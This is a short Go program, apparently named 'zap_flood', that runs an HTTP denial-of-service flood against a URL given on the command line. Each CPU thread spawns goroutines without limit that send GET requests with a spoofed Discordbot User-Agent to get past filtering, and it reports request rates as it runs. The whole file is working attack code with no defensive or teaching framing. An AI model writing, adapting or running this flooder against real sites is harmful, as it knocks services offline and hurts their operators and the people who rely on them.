package main

import (
	"fmt"
	"net/http"
	"os"
	"strconv"
	"sync/atomic"
	"time"
	"runtime"
)

var totalRequests uint64

func flood(target string, duration int) {
	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	end := time.Now().Add(time.Duration(duration) * time.Second)

	for time.Now().Before(end) {
		go func() {
			req, _ := http.NewRequest("GET", target, nil)
			req.Header.Set("User-Agent", "Discordbot/2.0 (+https://discordapp.com)")

			_, err := client.Do(req)
			if err == nil {
				atomic.AddUint64(&totalRequests, 1)
			}
			// No logging, no prints — silent flood
		}()
	}
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./zap_flood <url> <duration_in_seconds>")
		return
	}

	target := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])

	fmt.Printf("Launching HTTP flood on %s for %d seconds using %d threads\n", target, duration, runtime.NumCPU())

	for i := 0; i < runtime.NumCPU(); i++ {
		go flood(target, duration)
	}

	ticker := time.NewTicker(10 * time.Second)
	done := time.After(time.Duration(duration) * time.Second)

	var lastCount uint64

loop:
	for {
		select {
		case <-ticker.C:
			now := atomic.LoadUint64(&totalRequests)
			rps := now - lastCount
			lastCount = now
			fmt.Printf("[ZAP FLOOD] Total: %d | RPS: %d\n", now, rps)
		case <-done:
			break loop
		}
	}

	fmt.Printf("Flooding ended. Total Requests: %d\n", totalRequests)
}
